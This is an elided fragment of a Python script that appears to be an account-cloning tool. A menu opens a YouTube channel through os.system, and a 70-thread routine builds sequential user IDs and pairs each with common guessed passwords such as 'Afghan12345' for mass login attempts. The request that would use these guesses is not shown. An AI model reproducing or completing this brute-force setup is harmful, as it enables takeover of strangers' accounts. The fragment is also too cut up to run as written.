        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://youtube.com/@princehamzayt6210/{wx}');riaz()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://youtube.com/@princehamzayt6210');riaz()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@princehamzayt6210');riaz()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        print('\x1b[1;91m flight mod ✘✘✘')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghanistan','Afghan12345','Afghan123','۱۲۳۴۵۶']
